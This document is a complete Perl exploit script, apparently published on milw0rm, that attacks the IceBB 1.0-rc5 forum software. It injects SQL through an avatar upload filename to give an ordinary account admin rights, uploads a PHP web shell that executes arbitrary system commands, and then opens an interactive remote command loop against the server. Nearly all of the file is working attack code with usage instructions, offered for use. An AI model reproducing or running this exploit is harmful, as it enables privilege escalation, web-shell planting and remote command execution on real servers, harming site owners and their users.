#!/usr/bin/perl
#  IceBB 1.0-rc5 Remote Code Execution Exploit
#  1. register a user
#  2. run this exploit with this usage : $perl xpl.pl [host&path] [uname] [pass]
#  3. login with admin access :)
#
#
#### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net

use LWP::UserAgent;
use HTTP::Cookies;

$port = "80";
 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;

 print q(
 ###########################################################
 #          IceBB 1.0-rc5 Remote Code Exec Exploit         #
 #                    www.Hessamx.Net                      #
 ################# (C)oded By Hessam-x #####################

);


 if (@ARGV < 3) {
 print " #  usage : xpl.pl [host&path] [uname] [pass]\n";
 print " #  e.g : xpl.pl www.milw0rm.com/icebb/ str0ke 123456\n";
 exit();
 }

   print " [~] User/Password : $uname/$passwd \n";
   print " [~] Host : $host \n";

 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->cookie_jar( $cookie_jar );


$login = $xpl->post($url.'index.php',
Content => [
 'act' => 'login',
'from' => 'index.php',
'user' => $uname,
'pass' => $passwd,
'func' => 'Login',
],);

 if($cookie_jar->as_string =~ /icebb_sessid=(.*?);/) {
       $cookie = $1;
   print " [~] Logined ...\n";
 } else {
 print " [-] Can not Login In $host !\n";
 exit();
 }

 $badcode = "', user_group='1";
 $avata = $xpl->post($url.'index.php',Content_Type => 'form-data',
 Content => [
 'avtype'  => 'upload',
 'act' => 'ucp',
 'func' => 'avatar',
 'file'   => [
              undef,
              'avatar.jpg'.$badcode,
              Content_type => 'text/plain',
              Content => 'MYAVATAR',
             ],
 'submit'        => 'Save',
 ],
 );
 $avat = $xpl->post($url.'index.php',Content_Type => 'form-data',
 Content => [
 'avtype'  => 'upload',
 'act' => 'ucp',
 'func' => 'avatar',
 'file'   => [
              undef,
              'shell.php'.$badcode,
              Content_type => 'text/plain',
              Content => '<? echo 1 ; echo _START_ ; system(\$_GET[\'cmd\']); echo _END_ ; ?>',
             ],
 'submit'        => 'Save',
 ],
 );
 $test = $xpl->get($url.'index.php');
if($test->as_string =~ /Admin Control Center/) {
print " [+] You Are admin Now ! \n";
} else {
print " [-] Exploit Failed ! \n";
exit();
}
if($test->as_string =~ /profile=(.*?)'>/) {
 $uid = $1;
print " [~] User id : $1 \n";
} else {
print " [?] please enter user id : ";
     chomp($uid=<STDIN>);
}

   while ()
{
     print "\n[Shell - type 'exit' for exit]\$ ";
     chomp($exc=<STDIN>);
    &sys($exc);
}
sub sys($exc) {
     if ($exc eq 'exit') { exit() ; }
 $res = $xpl->get($url.'uploads/av-'.$uid.'.php?cmd='.$exc);
 @result = split(/\n/,$res->content);
 $runned = 0;
 $on = 0;
 for $res(@result) {
   if ($res =~ /^_END_/) { print "\n"; return 0; }
   if ($on == 0) { print "  $res\n"; }
   if ($res =~ /^_START_/) { $on = 1; $runned = 1; }
 }
   if (!$runned) { print "\n Can not execute command . EXPLOIT FAILED !\n" ; exit(); };

 }


print "\n #################################################### \n";

# milw0rm.com [2007-03-26]
